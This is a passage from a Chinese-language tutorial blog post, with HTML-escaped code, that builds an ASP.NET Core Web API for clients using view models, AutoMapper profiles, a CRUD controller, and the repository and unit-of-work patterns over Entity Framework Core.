            Context.Set&lt;/span&gt;&amp;lt;T&amp;gt;&lt;span&gt;().Attach(entity);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AttachRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; entity &lt;span&gt;in&lt;/span&gt;&lt;span&gt; entities)
            {
                Attach(entity);
            }
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Detach(T entity)
        {
            Context.Entry&lt;/span&gt;&amp;lt;T&amp;gt;(entity).State =&lt;span&gt; EntityState.Detached;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DetachRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; entity &lt;span&gt;in&lt;/span&gt;&lt;span&gt; entities)
            {
                Detach(entity);
            }
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; AttachAsModified(T entity)
        {
            Attach(entity);
            Update(entity);
        }
        
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在CoreApi.ViewModels建立Angular文件夹, 分别针对查询, 新增, 修改建立3个ViewModel(Dto):&lt;/p&gt;
&lt;p&gt;ClientViewModel:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.ViewModels.Angular
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ClientViewModel : EntityBase
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;decimal&lt;/span&gt; Balance { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Email { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FirstName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; LastName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Phone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ClientCreationViewModel:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.ViewModels.Angular
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ClientCreationViewModel
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;decimal&lt;/span&gt; Balance { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        
        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Email { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        
        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FirstName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        
        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; LastName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Phone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ClientModificationViewModel:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.ViewModels.Angular
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ClientModificationViewModel
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;decimal&lt;/span&gt; Balance { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Email { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FirstName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; LastName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        [Required]
        [MaxLength(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Phone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;针对Client和它的Viewmodels, 分别从两个方向进行配置:&lt;/p&gt;
&lt;p&gt;DomainToViewModelMappingProfile:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Web.MyConfigurations
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DomainToViewModelMappingProfile : Profile
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; ProfileName =&amp;gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DomainToViewModelMappings&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; DomainToViewModelMappingProfile()
        {
            CreateMap&lt;/span&gt;&amp;lt;UploadedFile, UploadedFileViewModel&amp;gt;&lt;span&gt;();
            &lt;span&gt;CreateMap&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;Client, ClientViewModel&amp;gt;();
            CreateMap&amp;lt;Client, ClientModificationViewModel&amp;gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;();&lt;/span&gt;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ViewModelToDomainMappingProfile:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Web.MyConfigurations
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ViewModelToDomainMappingProfile : Profile
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; ProfileName =&amp;gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ViewModelToDomainMappings&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ViewModelToDomainMappingProfile()
        {
            CreateMap&lt;/span&gt;&amp;lt;UploadedFileViewModel, UploadedFile&amp;gt;&lt;span&gt;();
            &lt;span&gt;CreateMap&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;ClientViewModel, Client&amp;gt;();
            CreateMap&amp;lt;ClientCreationViewModel, Client&amp;gt;();
            CreateMap&amp;lt;ClientModificationViewModel, Client&amp;gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;();&lt;/span&gt;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在web项目的StartUp.cs的ConfigureServices里面为ClientRepository注册DI:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
services.AddScoped&amp;lt;IClientRepository, ClientRepository&amp;gt;();
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在controllers目录建立Angular/ClientController.cs:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Web.Controllers.Angular
{
    [Route(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;api/[controller]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ClientController : BaseController&amp;lt;ClientController&amp;gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IClientRepository _clientRepository;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ClientController(ICoreService&amp;lt;ClientController&amp;gt;&lt;span&gt; coreService,
            IClientRepository clientRepository) : &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;(coreService)
        {
            _clientRepository &lt;/span&gt;=&lt;span&gt; clientRepository;
        }

        [HttpGet]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt;&lt;span&gt; GetAll()
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; items = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _clientRepository.All.ToListAsync();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; results = Mapper.Map&amp;lt;IEnumerable&amp;lt;ClientViewModel&amp;gt;&amp;gt;&lt;span&gt;(items);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Ok(results);
        }

        [HttpGet]
        [Route(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;GetClient&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; Get(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; item = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _clientRepository.GetSingleAsync(id);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (item == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NotFound();
            }
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = Mapper.Map&amp;lt;ClientViewModel&amp;gt;&lt;span&gt;(item);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Ok(result);
        }

        [HttpPost]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt;&lt;span&gt; Post([FromBody] ClientCreationViewModel clientVm)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (clientVm == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest();
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;ModelState.IsValid)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest(ModelState);
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; newItem = Mapper.Map&amp;lt;Client&amp;gt;&lt;span&gt;(clientVm);
            newItem.SetCreation(UserName);
            _clientRepository.Add(newItem);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;await&lt;/span&gt;&lt;span&gt; UnitOfWork.SaveAsync())
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; StatusCode(&lt;span&gt;500&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;保存客户时出错&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; vm = Mapper.Map&amp;lt;ClientViewModel&amp;gt;&lt;span&gt;(newItem);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CreatedAtRoute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;GetClient&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; { id =&lt;span&gt; vm.Id }, vm);
        }

        [HttpPut(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; Put(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id, [FromBody] ClientModificationViewModel clientVm)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (clientVm == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest();
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;ModelState.IsValid)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest(ModelState);
            }
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; dbItem = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _clientRepository.GetSingleAsync(id);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (dbItem == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NotFound();
            }
            Mapper.Map(clientVm, dbItem);
            dbItem.SetModification(UserName);
            _clientRepository.Update(dbItem);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;await&lt;/span&gt;&lt;span&gt; UnitOfWork.SaveAsync())
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; StatusCode(&lt;span&gt;500&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;保存客户时出错&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NoContent();
        }

        [HttpPatch(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; Patch(&lt;span&gt;int&lt;/span&gt; id, [FromBody] JsonPatchDocument&amp;lt;ClientModificationViewModel&amp;gt;&lt;span&gt; patchDoc)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (patchDoc == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest();
            }
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; dbItem = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _clientRepository.GetSingleAsync(id);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (dbItem == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NotFound();
            }
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; toPatchVm = Mapper.Map&amp;lt;ClientModificationViewModel&amp;gt;&lt;span&gt;(dbItem);
            patchDoc.ApplyTo(toPatchVm, ModelState);

            TryValidateModel(toPatchVm);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;ModelState.IsValid)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest(ModelState);
            }

            Mapper.Map(toPatchVm, dbItem);

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;await&lt;/span&gt;&lt;span&gt; UnitOfWork.SaveAsync())
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; StatusCode(&lt;span&gt;500&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;更新的时候出错&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NoContent();
        }

        [HttpDelete(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; Delete(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; model = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _clientRepository.GetSingleAsync(id);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (model == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NotFound();
            }
            _clientRepository.Delete(model);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;await&lt;/span&gt;&lt;span&gt; UnitOfWork.SaveAsync())
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; StatusCode(&lt;span&gt;500&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;删除的时候出错&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NoContent();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;首先, Controller继承了ControllerBase这个类, ControllerBase是自己写的类, 里面可以放置一些公用的方法或属性, 目前里面的东西都没用:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Web.Controllers.Bases
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; BaseController&amp;lt;T&amp;gt;&lt;span&gt; : Controller
    {
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IUnitOfWork UnitOfWork;
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; ILogger&amp;lt;T&amp;gt;&lt;span&gt; Logger;
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IFileProvider FileProvider;
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; ICoreService&amp;lt;T&amp;gt;&lt;span&gt; CoreService;

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; BaseController(ICoreService&amp;lt;T&amp;gt;&lt;span&gt; coreService)
        {
            CoreService &lt;/span&gt;=&lt;span&gt; coreService;
            UnitOfWork &lt;/span&gt;=&lt;span&gt; coreService.UnitOfWork;
            Logger &lt;/span&gt;=&lt;span&gt; coreService.Logger;
            FileProvider &lt;/span&gt;=&lt;span&gt; coreService.FileProvider;
        }

        &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; Current Information

        &lt;span&gt;protected&lt;/span&gt; DateTime Now =&amp;gt;&lt;span&gt; DateTime.Now;
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserName =&amp;gt; User.Identity.Name ?? &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Anonymous&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;&lt;span&gt;

    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于父类构造函数依赖的类太多了, 所以我建立了一个CoreService, 里面包含着这些依赖, 然后用一个变量就注入进去了, 这种写法不一定正确:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; ICoreService&amp;lt;&lt;span&gt;out&lt;/span&gt; T&amp;gt;&lt;span&gt; : IDisposable
    {
        IUnitOfWork UnitOfWork { &lt;/span&gt;&lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        ILogger&lt;/span&gt;&amp;lt;T&amp;gt; Logger { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        IFileProvider FileProvider { &lt;/span&gt;&lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Controller里面的方法应该都能看明白吧. 需要提一下的是UnitOfWork. &lt;/p&gt;

&lt;p&gt;我才用的是UnitOfWork和Repository模式, 多个Repository挂起的数据库操作, 可以使用一个UnitOfWork一次性提交.&lt;/p&gt;
&lt;p&gt;由于DBContext已经实现了UnitOfWork模式, 所以可以直接在Controller里面使用DbContext, 但是我还是做了一个接口 IUnitOfWork:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.DataContext.Infrastructure
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IUnitOfWork: IDisposable
    {
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; SaveChanges();
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; SaveChanges(&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; acceptAllChangesOnSuccess);
        Task&lt;/span&gt;&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt; SaveChangesAsync(&lt;span&gt;bool&lt;/span&gt; acceptAllChangesOnSuccess, CancellationToken cancellationToken = &lt;span&gt;default&lt;/span&gt;&lt;span&gt;(CancellationToken));
        Task&lt;/span&gt;&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt; SaveChangesAsync(CancellationToken cancellationToken = &lt;span&gt;default&lt;/span&gt;&lt;span&gt;(CancellationToken));

        &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; Save();
        &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; Save(&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; acceptAllChangesOnSuccess);
        Task&lt;/span&gt;&amp;lt;&lt;span&gt;bool&lt;/span&gt;&amp;gt; SaveAsync(&lt;span&gt;bool&lt;/span&gt; acceptAllChangesOnSuccess, CancellationToken cancellationToken = &lt;span&gt;default&lt;/span&gt;&lt;span&gt;(CancellationToken));
        Task&lt;/span&gt;&amp;lt;&lt;span&gt;bool&lt;/span&gt;&amp;gt; SaveAsync(CancellationToken cancellationToken = &lt;span&gt;default&lt;/span&gt;&lt;span&gt;(CancellationToken));
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;里面前4个方法就是DbContext内置的方法, 后面4个方法可有可无, 就是上面4个方法的简单变形.&lt;/p&gt;
&lt;p&gt;看一下CoreContext:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.DataContext.Core
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CoreContext : DbContext, IUnitOfWork
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; CoreContext(DbContextOptions&amp;lt;CoreContext&amp;gt;&lt;span&gt; options)
            : &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;(options)
        {
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnModelCreating(ModelBuilder modelBuilder)
        {
            &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;.OnModelCreating(modelBuilder);
            modelBuilder.HasDefaultSchema(AppSettings.DefaultSchema);

            modelBuilder.ApplyConfiguration(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; UploadedFileConfiguration());
            modelBuilder.ApplyConfiguration(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ClientConfiguration());
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DbSet&amp;lt;UploadedFile&amp;gt; UploadedFiles { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DbSet&amp;lt;Client&amp;gt; Clients { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; Save()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; SaveChanges() &amp;gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; Save(&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; acceptAllChangesOnSuccess)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; SaveChanges(acceptAllChangesOnSuccess) &amp;gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;&lt;span&gt;bool&lt;/span&gt;&amp;gt; SaveAsync(&lt;span&gt;bool&lt;/span&gt; acceptAllChangesOnSuccess, CancellationToken cancellationToken = &lt;span&gt;default&lt;/span&gt;&lt;span&gt;(CancellationToken))
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt; SaveChangesAsync(acceptAllChangesOnSuccess, cancellationToken) &amp;gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        }

